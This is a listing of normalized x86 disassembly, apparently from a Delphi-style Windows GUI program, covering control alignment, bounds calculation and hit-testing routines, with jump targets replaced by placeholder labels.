pop ebx
mov esp ebp
pop ebp
retn
sub_43fd84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43fc74
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4446f8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43fcf8
pop ecx
jmp r-xdata
sub_43fde4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43fed2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fed9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43def4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43dec4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43dec4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043c8
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_404010
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43dde4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43fee0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403468
sub_43ff0c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ff2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ff4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ff6c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ff8c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ffac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43ffcc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4197d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43d518
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403468
sub_440004
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4400a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414068
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44a8c0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44a9f8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44a758
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44ab18
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4400a7
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4400b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_4400ec
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_4400b0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44019c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033f8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4401d0
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4401f0
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403468
test al al
je r-xdata
mov eax edi
call sub_440230
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44025c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_440288
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406980
mov eax esp
call sub_4125e4
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43da08
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403468
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403468
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43da34
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4125e4
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_41256c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43d9dc
sub_4403b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_4403f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cc08
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_440424
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44051c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43cfc4
push ebx
push sub_441eb4
call sub_41a410
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ccb8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41ce60
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403590
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c888
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_404010
lea eax [ ebx + 0x188 ]
call sub_403fbc
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440523
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_440523
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_440548
push ebx
push esi
push edi
call sub_4035f8
mov ebx edx
mov edi eax
mov eax edi
call sub_419620
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405628
mov eax [ edi + 0x178 ]
call sub_40326c
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43bb70
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_4411e8
mov eax edi
call sub_441428
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_40326c
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4413ec
mov esi eax
mov edx esi
mov eax edi
call sub_441254
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_441428
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43d09c
test bl bl
jle r-xdata
call sub_41a4a8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
sub_440618
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4406dc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413b68
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_4448b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139c8
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413abc
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4139c8
test eax eax
je r-xdata
sub_4406ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440f90
xor eax eax
push ebp
push sub_44072c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440733
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
sub_440733
mov eax [ ebp - 0x4 ]
call sub_440618
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441dec
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43f0c4
sub_440768
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_440783 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_4407f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4449fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_41256c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_440b75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b7c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_440a8a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4409ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_440b7c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_440bab ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_440c34
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441428
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41386c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
